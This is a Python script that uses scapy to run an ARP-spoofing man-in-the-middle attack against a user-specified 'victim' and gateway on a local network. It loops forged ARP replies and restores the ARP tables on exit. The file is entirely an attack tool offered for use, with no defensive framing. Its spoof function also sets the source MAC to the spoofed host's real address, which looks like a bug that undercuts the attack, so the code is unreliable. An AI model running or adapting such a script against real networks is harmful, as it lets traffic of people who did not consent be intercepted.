import optparse
import scapy.all as scapy
import time

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest = "target_ip", help="Specify Victim IP Address")
    parser.add_option("-r", "--router", dest = "router_ip", help="Specify Gateway IP Address")

    options, arguments = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a Victim ip , user -h for help")
    
    if not options.router_ip:
        parser.error("[-] Please specify the router ip, use -h for help")
    
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = arp_broadcast/arp_request
    answered = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_response, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_response, verbose=False, count=4)


options = get_arguments()
spoof_ip = options.router_ip
target_ip = options.target_ip
try:
    while True:
        time.sleep(2)
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        print("[+] 2 Packet Sent")
except KeyboardInterrupt:
    restore(target_ip, spoof_ip)
    print("Exit....")